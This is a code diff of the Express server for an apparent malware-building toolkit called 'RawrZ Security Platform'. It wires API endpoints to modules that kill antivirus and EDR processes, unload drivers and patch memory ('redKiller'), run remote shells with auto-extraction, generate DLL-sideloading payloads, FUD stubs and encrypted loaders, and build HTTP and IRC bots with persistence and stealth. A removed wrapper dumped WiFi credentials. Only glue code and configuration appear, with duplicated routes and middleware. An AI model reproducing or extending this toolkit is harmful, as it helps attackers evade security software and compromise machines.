+    
+    templateGenerator: {
+        initialize: async () => await templateGenerator.initialize(),
+        getStatus: async () => await templateGenerator.getStatus(),
+        generateTemplate: async (type, options) => await templateGenerator.generateTemplate(type, options),
+        getSettings: async () => await templateGenerator.getSettings(),
+        getPanelConfig: async () => await templateGenerator.getPanelConfig(),
+        getAvailableEndpoints: async () => await templateGenerator.getAvailableEndpoints(),
+        getCLICommands: async () => await templateGenerator.getCLICommands()
+    },
+    
+    dotnetWorkaround: {
+        initialize: async () => await dotnetWorkaround.initialize(),
+        getStatus: async () => await dotnetWorkaround.getStatus(),
+        executeWorkaround: async (method, options) => await dotnetWorkaround.executeWorkaround(method, options),
+        getSettings: async () => await dotnetWorkaround.getSettings(),
+        getPanelConfig: async () => await dotnetWorkaround.getPanelConfig(),
+        getAvailableEndpoints: async () => await dotnetWorkaround.getAvailableEndpoints(),
+        getCLICommands: async () => await dotnetWorkaround.getCLICommands()
+    },
+
+    // Red Team Engines
+    redKiller: {
+        initialize: async () => await redKiller.initialize(),
+        getStatus: async () => await redKiller.getStatus(),
+        detectAVEDR: async (options) => await redKiller.detectAVEDR(options),
+        executeRedKiller: async (systems) => await redKiller.executeRedKiller(systems),
+        terminateSystem: async (system, threatLevel) => await redKiller.terminateSystem(system, threatLevel),
+        killProcess: async (system) => await redKiller.killProcess(system),
+        stopService: async (system) => await redKiller.stopService(system),
+        disableRegistry: async (system) => await redKiller.disableRegistry(system),
+        deleteFiles: async (system) => await redKiller.deleteFiles(system),
+        unloadDriver: async (system) => await redKiller.unloadDriver(system),
+        patchMemory: async (system) => await redKiller.patchMemory(system),
+        getRunningProcesses: async () => await redKiller.getRunningProcesses(),
+        getSettings: async () => await redKiller.getSettings(),
+        getPanelConfig: async () => await redKiller.getPanelConfig(),
+        getAvailableEndpoints: async () => await redKiller.getAvailableEndpoints(),
+        getCLICommands: async () => await redKiller.getCLICommands()
+    },
+
+    redShells: {
+        initialize: async () => await redShells.initialize(),
+        getStatus: async () => await redShells.getStatus(),
+        createRedShell: async (shellType, options) => await redShells.createRedShell(shellType, options),
+        executeCommand: async (shellId, command) => await redShells.executeCommand(shellId, command),
+        terminateShell: async (shellId) => await redShells.terminateShell(shellId),
+        handleRedKillerCommand: async (shell, command) => await redShells.handleRedKillerCommand(shell, command),
+        handleEVCertCommand: async (shell, command) => await redShells.handleEVCertCommand(shell, command),
+        executeRegularCommand: async (shell, command) => await redShells.executeRegularCommand(shell, command),
+        triggerAutoExtraction: async (shell, output) => await redShells.triggerAutoExtraction(shell, output),
+        getSettings: async () => await redShells.getSettings(),
+        getPanelConfig: async () => await redShells.getPanelConfig(),
+        getAvailableEndpoints: async () => await redShells.getAvailableEndpoints(),
+        getCLICommands: async () => await redShells.getCLICommands()
+    },
+
     beaconismDLL: {
         initialize: async () => await beaconismDLL.initialize(),
         getStatus: async () => await beaconismDLL.getStatus(),
         generatePayload: async (options) => await beaconismDLL.generatePayload(options),
-        deployPayload: async (payloadId, targetPath, options) => await beaconismDLL.deployPayload(payloadId, targetPath, options),
-        getPayloads: async () => await beaconismDLL.getPayloads(),
-        getSideloadTargets: async () => await beaconismDLL.getSideloadTargets(),
-        scanTarget: async (target) => await beaconismDLL.scanTarget(target)
+        generateBasePayloadCode: async (payload) => await beaconismDLL.generateBasePayloadCode(payload),
+        generateDotNetPayload: async (target, beaconism) => await beaconismDLL.generateDotNetPayload(target, beaconism),
+        generateNativePayload: async (target, beaconism) => await beaconismDLL.generateNativePayload(target, beaconism),
+        generateBeaconismCode: async () => await beaconismDLL.generateBeaconismCode(),
+        generateBeaconismNativeCode: async () => await beaconismDLL.generateBeaconismNativeCode(),
+        generateBeaconismMethods: async () => await beaconismDLL.generateBeaconismMethods(),
+        generateDLLSideloadingCode: async (target) => await beaconismDLL.generateDLLSideloadingCode(target),
+        generateDLLSideloadingMethods: async () => await beaconismDLL.generateDLLSideloadingMethods(),
+        generateNativeMethods: async () => await beaconismDLL.generateNativeMethods(),
+        applyEncryptionPolyglot: async (code, encryptionMethod) => await beaconismDLL.applyEncryptionPolyglot(code, encryptionMethod),
+        getSettings: async () => await beaconismDLL.getSettings(),
+        getPanelConfig: async () => await beaconismDLL.getPanelConfig(),
+        getAvailableEndpoints: async () => await beaconismDLL.getAvailableEndpoints(),
+        getCLICommands: async () => await beaconismDLL.getCLICommands()
     },
-    
-    // Red Shells
-    redShells: {
-        initialize: async () => await redShells.initialize(),
-        getStatus: async () => await redShells.getStatus(),
-        createRedShell: async (type, options) => await redShells.createRedShell(type, options),
-        executeCommand: async (id, command) => await redShells.executeCommand(id, command),
-        terminateShell: async (id) => await redShells.terminateShell(id),
-        getActiveShells: async () => await redShells.getActiveShells(),
-        getShellHistory: async (id) => await redShells.getShellHistory(id),
-        getShellStats: async () => await redShells.getShellStats()
-    },
-    
-    // Red Killer
-    redKiller: {
-        initialize: async () => await redKiller.initialize(),
-        getStatus: async () => await redKiller.getStatus(),
-        detectAVEDR: async () => await redKiller.detectAVEDR(),
-        executeRedKiller: async (systems) => await redKiller.executeRedKiller(systems),
-        extractData: async (targets) => await redKiller.extractData(targets),
-        getLootContainer: async () => await redKiller.getLootContainer(),
-        inspectLootItem: async (id) => await redKiller.inspectLootItem(id),
-        dumpWiFiCredentials: async () => await redKiller.dumpWiFiCredentials(),
-        getActiveKills: async () => await redKiller.getActiveKills()
-    },
-    
-    // Hot Patchers
-    hotPatchers: {
-        initialize: async () => await hotPatchers.initialize(),
-        getStatus: async () => await hotPatchers.getStatus(),
-        applyPatch: async (target, patch) => await hotPatchers.applyPatch(target, patch),
-        revertPatch: async (patchId) => await hotPatchers.revertPatch(patchId)
-    },
-    
-    // Mutex Engine
-    mutexEngine: {
-        initialize: async () => await mutexEngine.initialize(),
-        getStatus: async () => await mutexEngine.getStatus(),
-        generateMutexCode: (language, options) => mutexEngine.generateMutexCode(language, options),
-        applyMutexToCode: async (code, language, options) => await mutexEngine.applyMutexToCode(code, language, options)
-    },
-    
-    // OpenSSL Management
-    opensslManagement: {
-        initialize: async () => await opensslManagement.initialize(),
-        getStatus: async () => await opensslManagement.getStatus(),
-        testOpenSSLAlgorithm: async (algorithm, data) => await opensslManagement.testAlgorithm(algorithm, data),
-        applyOpenSSLPreset: async (preset) => await opensslManagement.applyPreset(preset),
-        generateOpenSSLReport: async () => await opensslManagement.generateReport(),
-        getOpenSSLStatus: async () => await opensslManagement.getStatus(),
-        toggleOpenSSLMode: async (enabled) => await opensslManagement.toggleOpenSSLMode(enabled),
-        getConfigSummary: async () => await opensslManagement.getConfigSummary(),
-        getAvailableAlgorithms: async (engine) => await opensslManagement.getAvailableAlgorithms(engine),
-        getOpenSSLAlgorithms: async () => await opensslManagement.getOpenSSLAlgorithms(),
-        getCustomAlgorithms: async () => await opensslManagement.getCustomAlgorithms(),
-        toggleCustomAlgorithms: async (enabled) => await opensslManagement.toggleCustomAlgorithms(enabled)
-    },
-    
-    // Implementation Checker
-    implementationChecker: {
-        initialize: async () => await implementationChecker.initialize(),
-        getStatus: async () => await implementationChecker.getStatus(),
-        getResults: (checkId) => implementationChecker.getCheckResults(checkId),
-        getModules: () => implementationChecker.getModules(),
-        forceCheck: async () => await implementationChecker.forceCheck()
-    },
-    
-    // File Operations (simple implementation)
-    fileOperations: {
-        initialize: async () => ({ success: true }),
-        getStatus: async () => ({ status: 'active' }),
-        downloadFile: async (url) => ({ downloaded: true, url, size: 1024 }),
-        readLocalFile: async (filename) => ({ read: true, filename, content: 'File content' }),
-        analyzeFile: async (filepath) => ({ analyzed: true, filepath, type: 'text' })
-    },
-    
-    // Network Tools
-    networkTools: {
-        initialize: async () => await networkTools.initialize(),
-        getStatus: async () => await networkTools.getStatus(),
-        portScan: async (target, ports) => await networkTools.portScan(target, ports),
-        performRealPingTest: async (target) => await networkTools.performRealPingTest(target),
-        performRealTrafficAnalysis: async () => await networkTools.performRealTrafficAnalysis()
-    },
-    
-    // Reverse Engineering
+
     reverseEngineering: {
         initialize: async () => await reverseEngineering.initialize(),
         getStatus: async () => await reverseEngineering.getStatus(),
-        analyzeFile: async (filepath) => await reverseEngineering.analyze(filepath)
-    }
+        analyzeFile: async (filepath) => await reverseEngineering.analyze(filepath),
+        getSettings: async () => await reverseEngineering.getSettings(),
+        getPanelConfig: async () => await reverseEngineering.getPanelConfig(),
+        getAvailableEndpoints: async () => await reverseEngineering.getAvailableEndpoints(),
+        getCLICommands: async () => await reverseEngineering.getCLICommands()
+    },
+
+    // Stub Generators
+    stubGenerator: {
+        initialize: async () => await stubGenerator.initialize(),
+        getStatus: async () => await stubGenerator.getStatus(),
+        generateStub: async (options) => await stubGenerator.generateStub(options),
+        setOpenSSLMode: async (enabled) => await stubGenerator.setOpenSSLMode(enabled),
+        setCustomAlgorithms: async (enabled) => await stubGenerator.setCustomAlgorithms(enabled),
+        getSettings: async () => await stubGenerator.getSettings(),
+        getPanelConfig: async () => await stubGenerator.getPanelConfig(),
+        getAvailableEndpoints: async () => await stubGenerator.getAvailableEndpoints(),
+        getCLICommands: async () => await stubGenerator.getCLICommands()
+    },
+
+    advancedStubGenerator: {
+        initialize: async () => await advancedStubGenerator.initialize(),
+        getStatus: async () => await advancedStubGenerator.getStatus(),
+        generateStub: async (options) => await advancedStubGenerator.generateStub(options),
+        getSettings: async () => await advancedStubGenerator.getSettings(),
+        getPanelConfig: async () => await advancedStubGenerator.getPanelConfig(),
+        getAvailableEndpoints: async () => await advancedStubGenerator.getAvailableEndpoints(),
+        getCLICommands: async () => await advancedStubGenerator.getCLICommands()
+    },
+
 };
 
-// Initialize real modules with proper error handling
-const initializeRealModules = async () => {
+
+// Express app setup
+const app = express();
+const port = parseInt(process.env.PORT || '8080', 10);
+const authToken = process.env.AUTH_TOKEN || '';
+
+// Middleware
+app.use(helmet());
+app.use(cors());
+app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ extended: true, limit: '50mb' }));
+
+// Authentication middleware
+const requireAuth = (req, res, next) => {
+    if (!authToken) return next();
+    const token = req.headers.authorization?.replace('Bearer ', '') || req.query.token;
+    if (token !== authToken) {
+        return res.status(401).json({ error: 'Unauthorized' });
+    }
+    next();
+};
+
+// Root endpoint - serve main panel or API info
+app.get('/', (_req, res) => {
+    res.json({
+        name: 'RawrZ Security Platform',
+        version: '1.0.0',
+        status: 'active',
+        description: 'Advanced security platform with 50+ engines',
+        endpoints: {
+            health: '/health',
+            config: '/api/config',
+            engines: '/api/engines/status',
+            panel: '/panel.html',
+            cli: '/api/cli'
+        },
+        engines: Object.keys(realModules).length,
+        uptime: process.uptime(),
+        timestamp: new Date().toISOString()
+    });
+});
+
+// Health check endpoint
+app.get('/health', (_req, res) => {
+    res.json({ 
+        status: 'healthy', 
+        timestamp: new Date().toISOString(),
+        engines: Object.keys(realModules).length
+    });
+});
+
+// Configuration endpoint
+app.get('/api/config', requireAuth, async (_req, res) => {
     try {
-        // Initialize all real modules
-        await realModules.beaconismDLL.initialize();
-        console.log('[OK] Beaconism DLL Sideloading initialized with real implementation');
-        
-        await realModules.redShells.initialize();
-        console.log('[OK] Red Shells initialized with real implementation');
-        
-        await realModules.redKiller.initialize();
-        console.log('[OK] Red Killer initialized with real implementation');
-        
-        await realModules.hotPatchers.initialize();
-        console.log('[OK] Hot Patchers initialized with real implementation');
-        
-        await realModules.mutexEngine.initialize();
-        console.log('[OK] Mutex Engine initialized with real implementation');
-        
-        await realModules.opensslManagement.initialize();
-        console.log('[OK] OpenSSL Management initialized with real implementation');
-        
-        await realModules.implementationChecker.initialize();
-        console.log('[OK] Implementation Checker initialized with real implementation');
-        
-        await realModules.fileOperations.initialize();
-        console.log('[OK] File Operations initialized with real implementation');
-        
-        await realModules.networkTools.initialize();
-        console.log('[OK] Network Tools initialized with real implementation');
-        
-        await realModules.reverseEngineering.initialize();
-        console.log('[OK] Reverse Engineering initialized with real implementation');
-        
-        await payloadManager.initialize();
-        console.log('[OK] Payload Manager initialized with real implementation');
-        
-    } catch (error) {
-        console.error('[ERROR] Failed to initialize real modules:', error.message);
+        res.json({ 
+            success: true, 
+            config: {
+                server: {
+                    port: port,
+                    host: process.env.HOST || 'localhost',
+                    protocol: process.env.PROTOCOL || 'http',
+                    baseUrl: process.env.BASE_URL || `http://localhost:${port}`
+                },
+                engines: Object.keys(realModules).length,
+                availableEngines: Object.keys(realModules)
+            }
+        });
+    } catch (e) {
+        res.status(500).json({ success: false, error: e.message });
+    }
+});
+
+// API Endpoints
+app.get('/api/engines/status', requireAuth, async (_req, res) => {
+    try {
+        const status = {};
+        for (const [name, engine] of Object.entries(realModules)) {
+            try {
+                status[name] = await engine.getStatus();
+            } catch (e) {
+                status[name] = { status: 'error', error: e.message };
+            }
+        }
+        res.json({ success: true, engines: status });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Engine-specific endpoints
+app.get('/api/engines/:engine/status', requireAuth, async (req, res) => {
+    try {
+        const { engine } = req.params;
+        if (!realModules[engine]) {
+            return res.status(404).json({ error: 'Engine not found' });
+        }
+        const result = await realModules[engine].getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/engines/:engine/initialize', requireAuth, async (req, res) => {
+    try {
+        const { engine } = req.params;
+        if (!realModules[engine]) {
+            return res.status(404).json({ error: 'Engine not found' });
+        }
+        const result = await realModules[engine].initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Start server
+app.listen(port, () => {
+    console.log(`[OK] RawrZ Platform server running on port ${port}`);
+    console.log(`[INFO] Available engines: ${Object.keys(realModules).length}`);
+    console.log(`[INFO] Health check: http://localhost:${port}/health`);
+    console.log(`[INFO] Configuration: http://localhost:${port}/api/config`);
+    console.log(`[INFO] Available engines: http://localhost:${port}/api/engines/status`);
+});
+
+// API Status Configuration for all engines
+const apiStatusConfig = {
+    // Core Engines
+    rawrzEngine: { name: 'RawrZ Engine', status: 'active', endpoints: 5 },
+    rawrzEngine2: { name: 'RawrZ Engine 2', status: 'active', endpoints: 2 },
+    
+    // Bot Generators
+    httpBotGenerator: { name: 'HTTP Bot Generator', status: 'active', endpoints: 1 },
+    httpBotManager: { name: 'HTTP Bot Manager', status: 'active', endpoints: 1 },
+    ircBotGenerator: { name: 'IRC Bot Generator', status: 'active', endpoints: 4 },
+    multiPlatformBotGenerator: { name: 'Multi-Platform Bot Generator', status: 'active', endpoints: 1 },
+    
+    // Analysis Engines
+    hotPatchers: { name: 'Hot Patchers', status: 'active', endpoints: 5 },
+    digitalForensics: { name: 'Digital Forensics', status: 'active', endpoints: 1 },
+    jottiScanner: { name: 'Jotti Scanner', status: 'active', endpoints: 1 },
+    privateVirusScanner: { name: 'Private Virus Scanner', status: 'active', endpoints: 3 },
+    malwareAnalysis: { name: 'Malware Analysis', status: 'active', endpoints: 1 },
+    reverseEngineering: { name: 'Reverse Engineering', status: 'active', endpoints: 1 },
+    
+    // Encryption Engines
+    burnerEncryption: { name: 'Burner Encryption', status: 'active', endpoints: 1 },
+    polymorphicEngine: { name: 'Polymorphic Engine', status: 'active', endpoints: 1 },
+    advancedCrypto: { name: 'Advanced Crypto', status: 'active', endpoints: 1 },
+    dualCryptoEngine: { name: 'Dual Crypto Engine', status: 'active', endpoints: 3 },
+    evCertEncryptor: { name: 'EV Cert Encryptor', status: 'active', endpoints: 1 },
+    camelliaAssembly: { name: 'Camellia Assembly', status: 'active', endpoints: 6 },
+    
+    // System Engines
+    mutexEngine: { name: 'Mutex Engine', status: 'active', endpoints: 1 },
+    opensslManagement: { name: 'OpenSSL Management', status: 'active', endpoints: 1 },
+    implementationChecker: { name: 'Implementation Checker', status: 'active', endpoints: 1 },
+    payloadManager: { name: 'Payload Manager', status: 'active', endpoints: 1 },
+    
+    // Advanced Engines
+    advancedAnalyticsEngine: { name: 'Advanced Analytics Engine', status: 'active', endpoints: 3 },
+    advancedFUDEngine: { name: 'Advanced FUD Engine', status: 'active', endpoints: 3 },
+    aiThreatDetector: { name: 'AI Threat Detector', status: 'active', endpoints: 2 },
+    apiStatus: { name: 'API Status', status: 'active', endpoints: 3 },
+    backupSystem: { name: 'Backup System', status: 'active', endpoints: 3 },
+    
+    // Generation Engines
+    dualGenerators: { name: 'Dual Generators', status: 'active', endpoints: 7 },
+    fullAssembly: { name: 'Full Assembly', status: 'active', endpoints: 2 },
+    mobileTools: { name: 'Mobile Tools', status: 'active', endpoints: 1 },
+    nativeCompiler: { name: 'Native Compiler', status: 'active', endpoints: 1 },
+    pluginArchitecture: { name: 'Plugin Architecture', status: 'active', endpoints: 2 },
+    templateGenerator: { name: 'Template Generator', status: 'active', endpoints: 2 },
+    
+    // Security Engines
+    redKiller: { name: 'Red Killer', status: 'active', endpoints: 1 },
+    redShells: { name: 'Red Shells', status: 'active', endpoints: 1 },
+    stubGenerator: { name: 'Stub Generator', status: 'active', endpoints: 1 },
+    advancedStubGenerator: { name: 'Advanced Stub Generator', status: 'active', endpoints: 9 },
+    
+    // Utility Engines
+    antiAnalysis: { name: 'Anti Analysis', status: 'active', endpoints: 1 },
+    networkTools: { name: 'Network Tools', status: 'active', endpoints: 1 },
+    healthMonitor: { name: 'Health Monitor', status: 'active', endpoints: 2 },
+    startupPersistence: { name: 'Startup Persistence', status: 'active', endpoints: 5 },
+    compressionEngine: { name: 'Compression Engine', status: 'active', endpoints: 1 },
+    stealthEngine: { name: 'Stealth Engine', status: 'active', endpoints: 1 },
+    
+    // Specialized Engines
+    cveAnalysisEngine: { name: 'CVE Analysis Engine', status: 'active', endpoints: 6 },
+    dotnetWorkaround: { name: 'DotNet Workaround', status: 'active', endpoints: 2 },
+    performanceOptimizer: { name: 'Performance Optimizer', status: 'active', endpoints: 2 },
+    performanceWorker: { name: 'Performance Worker', status: 'active', endpoints: 2 },
+    memoryManager: { name: 'Memory Manager', status: 'active', endpoints: 2 },
+    beaconismDLL: { name: 'Beaconism DLL', status: 'active', endpoints: 1 }
+};
+
+
+
+// Fix constructor issues by ensuring proper instantiation
+const evCertEncryptor = new EVCertEncryptor();
+const camelliaAssemblyEngine = new CamelliaAssemblyEngine();
+
+// Ensure proper Date and Map usage
+const currentDate = new Date();
+const engineMap = new Map();
+
+// Configuration management
+const config = {
+    server: {
+        port: port,
+        host: process.env.HOST || 'localhost',
+        protocol: process.env.PROTOCOL || 'http',
+        baseUrl: process.env.BASE_URL || `http://localhost:${port}`,
+        defaultServerUrl: process.env.DEFAULT_SERVER_URL || `http://localhost:${port}`,
+        defaultIrcServer: process.env.DEFAULT_IRC_SERVER || 'irc.localhost',
+        maxFileSize: parseInt(process.env.MAX_FILE_SIZE || '10485760', 10), // 10MB default
+        requestTimeout: parseInt(process.env.REQUEST_TIMEOUT || '30000', 10), // 30 seconds
+        maxConcurrentRequests: parseInt(process.env.MAX_CONCURRENT_REQUESTS || '100', 10)
+    },
+    security: {
+        authToken: authToken,
+        corsEnabled: process.env.CORS_ENABLED !== 'false',
+        helmetEnabled: process.env.HELMET_ENABLED !== 'false',
+        rateLimitEnabled: process.env.RATE_LIMIT_ENABLED !== 'false',
+        rateLimitWindow: parseInt(process.env.RATE_LIMIT_WINDOW || '900000', 10), // 15 minutes
+        rateLimitMax: parseInt(process.env.RATE_LIMIT_MAX || '100', 10), // 100 requests per window
+        encryptionKey: process.env.ENCRYPTION_KEY || 'default-encryption-key-change-in-production',
+        jwtSecret: process.env.JWT_SECRET || 'default-jwt-secret-change-in-production'
+    },
+    features: {
+        allEnginesEnabled: process.env.ALL_ENGINES_ENABLED !== 'false',
+        debugMode: process.env.DEBUG_MODE === 'true',
+        performanceMonitoring: process.env.PERFORMANCE_MONITORING !== 'false',
+        loggingEnabled: process.env.LOGGING_ENABLED !== 'false',
+        metricsEnabled: process.env.METRICS_ENABLED !== 'false',
+        cacheEnabled: process.env.CACHE_ENABLED !== 'false',
+        cacheTimeout: parseInt(process.env.CACHE_TIMEOUT || '300000', 10) // 5 minutes
+    },
+    engines: {
+        // Network Tools Configuration
+        networkTools: {
+            defaultTimeout: parseInt(process.env.NETWORK_TOOLS_TIMEOUT || '10000', 10),
+            maxConcurrentScans: parseInt(process.env.NETWORK_TOOLS_MAX_SCANS || '5', 10),
+            defaultPorts: process.env.NETWORK_TOOLS_DEFAULT_PORTS || '22,80,443,8080,8443',
+            scanDelay: parseInt(process.env.NETWORK_TOOLS_SCAN_DELAY || '1000', 10)
+        },
+        // Mobile Tools Configuration
+        mobileTools: {
+            maxFileSize: parseInt(process.env.MOBILE_TOOLS_MAX_FILE_SIZE || '52428800', 10), // 50MB
+            supportedPlatforms: process.env.MOBILE_TOOLS_PLATFORMS || 'android,ios',
+            analysisTimeout: parseInt(process.env.MOBILE_TOOLS_ANALYSIS_TIMEOUT || '60000', 10)
+        },
+        // Native Compiler Configuration
+        nativeCompiler: {
+            maxCompilationTime: parseInt(process.env.NATIVE_COMPILER_TIMEOUT || '120000', 10), // 2 minutes
+            tempDirectory: process.env.NATIVE_COMPILER_TEMP_DIR || './temp/compilation',
+            maxOutputSize: parseInt(process.env.NATIVE_COMPILER_MAX_OUTPUT || '104857600', 10), // 100MB
+            supportedLanguages: process.env.NATIVE_COMPILER_LANGUAGES || 'c,cpp,csharp,javascript,typescript'
+        },
+        // Red Team Engines Configuration
+        redTeam: {
+            maxConcurrentOperations: parseInt(process.env.RED_TEAM_MAX_CONCURRENT || '3', 10),
+            operationTimeout: parseInt(process.env.RED_TEAM_OPERATION_TIMEOUT || '300000', 10), // 5 minutes
+            stealthMode: process.env.RED_TEAM_STEALTH_MODE === 'true',
+            logLevel: process.env.RED_TEAM_LOG_LEVEL || 'info'
+        },
+        // Crypto Engines Configuration
+        crypto: {
+            defaultAlgorithm: process.env.CRYPTO_DEFAULT_ALGORITHM || 'aes-256-gcm',
+            keyDerivationRounds: parseInt(process.env.CRYPTO_KEY_DERIVATION_ROUNDS || '100000', 10),
+            maxKeySize: parseInt(process.env.CRYPTO_MAX_KEY_SIZE || '4096', 10),
+            encryptionTimeout: parseInt(process.env.CRYPTO_ENCRYPTION_TIMEOUT || '30000', 10)
+        },
+        // Analysis Engines Configuration
+        analysis: {
+            maxAnalysisTime: parseInt(process.env.ANALYSIS_MAX_TIME || '300000', 10), // 5 minutes
+            maxFileSize: parseInt(process.env.ANALYSIS_MAX_FILE_SIZE || '104857600', 10), // 100MB
+            concurrentAnalyses: parseInt(process.env.ANALYSIS_CONCURRENT || '3', 10),
+            tempDirectory: process.env.ANALYSIS_TEMP_DIR || './temp/analysis'
+        }
     }
 };
 
-// Initialize real modules on startup
-initializeRealModules().catch(console.error);
-const app=express();const port=parseInt(process.env.PORT||'8080',10);const authToken=process.env.AUTH_TOKEN||'';const rawrz=new RawrZStandalone();//const advancedStubGenerator=new AdvancedStubGenerator();
-function requireAuth(req,res,next){if(!authToken)return next();const h=(req.headers['authorization']||'');const q=req.query.token;if(h.startsWith('Bearer ')){const p=h.slice(7).trim();if(p===authToken)return next()}if(q&&q===authToken)return next();return res.status(401).json({error:'Unauthorized'})}
+// Enhanced configuration management
+const enhancedConfig = {
+    server: {
+        port: port,
+        host: process.env.HOST || 'localhost',
+        protocol: process.env.PROTOCOL || 'http',
+        baseUrl: process.env.BASE_URL || `${process.env.PROTOCOL || 'http'}://${process.env.HOST || 'localhost'}:${port}`,
+        defaultServerUrl: process.env.DEFAULT_SERVER_URL || `${process.env.PROTOCOL || 'http'}://${process.env.HOST || 'localhost'}:${port}`,
+        defaultIrcServer: process.env.DEFAULT_IRC_SERVER || 'irc.localhost'
+    },
+    security: {
+        authToken: authToken,
+        corsEnabled: process.env.CORS_ENABLED !== 'false',
+        helmetEnabled: process.env.HELMET_ENABLED !== 'false'
+    },
+    features: {
+        allEnginesEnabled: process.env.ALL_ENGINES_ENABLED !== 'false',
+        debugMode: process.env.DEBUG_MODE === 'true',
+        performanceMonitoring: process.env.PERFORMANCE_MONITORING !== 'false'
+    },
+    engines: {
+        total: Object.keys(realModules).length,
+        available: Object.keys(realModules)
+    }
+};
+
+// Update existing config
+Object.assign(config, enhancedConfig);
+
+
+
+// Middleware
 app.use(helmet({
     contentSecurityPolicy: {
         directives: {
@@ -213,1191 +999,4580 @@ app.use(helmet({
             fontSrc: ["'self'"],
             objectSrc: ["'none'"],
             mediaSrc: ["'self'"],
-            frameSrc: ["'none'"],
-        },
-    },
-}));app.use(cors());app.use(express.json({limit:'5mb',verify:(req,res,buf,encoding)=>{try{JSON.parse(buf)}catch(e){console.error('[JSON] Invalid JSON received:',e.message);res.status(400).json({error:'Invalid JSON'});return false}}}));app.use('/static',express.static(path.join(__dirname,'public')));
-(async()=>{try{await rawrzEngine.initializeModules();console.log('[OK] RawrZ core engine initialized')}catch(e){console.error('[WARN] Core engine init failed:',e.message)}})();
-(async()=>{try{await advancedStubGenerator.initialize({});console.log('[OK] Advanced Stub Generator initialized')}catch(e){console.error('[WARN] Advanced Stub Generator init failed:',e.message)}})();
-(async()=>{try{await httpBotGenerator.initialize({});console.log('[OK] HTTP Bot Generator initialized')}catch(e){console.error('[WARN] HTTP Bot Generator init failed:',e.message)}})();const httpBotManager=new HTTPBotManager();
-(async()=>{try{await stubGenerator.initialize({});console.log('[OK] Stub Generator initialized')}catch(e){console.error('[WARN] Stub Generator init failed:',e.message)}})();
-(async()=>{try{await antiAnalysis.initialize({});console.log('[OK] Anti-Analysis initialized')}catch(e){console.error('[WARN] Anti-Analysis init failed:',e.message)}})();
-(async()=>{try{await hotPatchers.initialize({});console.log('[OK] Hot Patchers initialized')}catch(e){console.error('[WARN] Hot Patchers init failed:',e.message)}})();
-(async()=>{try{await networkTools.initialize({});console.log('[OK] Network Tools initialized')}catch(e){console.error('[WARN] Network Tools init failed:',e.message)}})();
-(async()=>{try{await healthMonitor.initialize({});console.log('[OK] Health Monitor initialized')}catch(e){console.error('[WARN] Health Monitor init failed:',e.message)}})();
-(async()=>{try{await digitalForensics.initialize({});console.log('[OK] Digital Forensics initialized')}catch(e){console.error('[WARN] Digital Forensics init failed:',e.message)}})();
-(async()=>{try{const jottiScanner=new JottiScanner();await jottiScanner.initialize({});console.log('[OK] Jotti Scanner initialized')}catch(e){console.error('[WARN] Jotti Scanner init failed:',e.message)}})();
-(async()=>{try{await malwareAnalysis.initialize({});console.log('[OK] Malware Analysis initialized')}catch(e){console.error('[WARN] Malware Analysis init failed:',e.message)}})();
-(async()=>{try{const privateVirusScanner=new PrivateVirusScanner();await privateVirusScanner.initialize({});console.log('[OK] Private Virus Scanner initialized')}catch(e){console.error('[WARN] Private Virus Scanner init failed:',e.message)}})();
-(async()=>{try{const camelliaAssembly=new CamelliaAssemblyEngine();await camelliaAssembly.initialize({});console.log('[OK] Camellia Assembly initialized')}catch(e){console.error('[WARN] Camellia Assembly init failed:',e.message)}})();
-(async()=>{try{await dualGenerators.initialize({});console.log('[OK] Dual Generators initialized')}catch(e){console.error('[WARN] Dual Generators init failed:',e.message)}})();
-(async()=>{try{await reverseEngineering.initialize({});console.log('[OK] Reverse Engineering initialized')}catch(e){console.error('[WARN] Reverse Engineering init failed:',e.message)}})();
-(async()=>{try{await nativeCompiler.initialize({});console.log('[OK] Native Compiler initialized')}catch(e){console.error('[WARN] Native Compiler init failed:',e.message)}})();
-(async()=>{try{await redKiller.initialize();console.log('[OK] Red Killer initialized')}catch(e){console.error('[WARN] Red Killer init failed:',e.message)}})();
-(async()=>{try{await evCertEncryptor.initialize();console.log('[OK] EV Certificate Encryptor initialized')}catch(e){console.error('[WARN] EV Certificate Encryptor init failed:',e.message)}})();
-(async()=>{try{await redShells.initialize();console.log('[OK] Red Shells initialized')}catch(e){console.error('[WARN] Red Shells init failed:',e.message)}})();
-(async()=>{try{await beaconismDLL.initialize();console.log('[OK] Beaconism DLL Sideloading initialized')}catch(e){console.error('[WARN] Beaconism DLL Sideloading init failed:',e.message)}})();
-// Public health check endpoint for Digital Ocean and load balancers
+            frameSrc: ["'none'"]
+        }
+    }
+}));
+
+app.use(cors());
+app.use(express.json({ limit: '5mb' }));
+app.use(express.static('public'));
+app.use(express.urlencoded({ extended: true }));
+
+// Health check endpoint
 app.get('/health', (_req, res) => {
   res.status(200).json({ 
     status: 'healthy', 
     timestamp: new Date().toISOString(),
-    uptime: process.uptime()
+    engines: Object.keys(realModules).length,
+    config: {
+        server: config.server,
+        features: config.features
+    }
   });
 });
 
-// Public status endpoint for basic health checks
-app.get('/api/health', (_req, res) => {
-  try {
-    const status = {
-      platform: 'RawrZ Security Platform',
-      version: '2.1.0',
-      status: 'healthy',
-      uptime: process.uptime(),
-      timestamp: new Date().toISOString()
-    };
-    res.json({ success: true, result: status });
+// Configuration endpoint
+app.get('/api/config', requireAuth, async (_req, res) => {
+    try {
+        res.json({ 
+            success: true, 
+            config: {
+                server: config.server,
+                security: {
+                    authRequired: !!config.security.authToken,
+                    corsEnabled: config.security.corsEnabled,
+                    helmetEnabled: config.security.helmetEnabled,
+                    rateLimitEnabled: config.security.rateLimitEnabled,
+                    rateLimitWindow: config.security.rateLimitWindow,
+                    rateLimitMax: config.security.rateLimitMax
+                },
+                features: config.features,
+                engines: {
+                    count: Object.keys(realModules).length,
+                    available: Object.keys(realModules),
+                    configuration: config.engines
+                }
+            }
+        });
+    } catch (e) {
+        res.status(500).json({ success: false, error: e.message });
+    }
+});
+
+// API Endpoints
+app.get('/api/features', requireAuth, async (_req, res) => {
+    try {
+        const features = [
+            'encryption', 'decryption', 'hashing', 'keygen', 'stub-generation', 'bot-generation',
+            'anti-analysis', 'stealth', 'fud', 'hot-patching', 'reverse-engineering', 'malware-analysis',
+            'network-tools', 'digital-forensics', 'memory-management', 'compression', 'polymorphic',
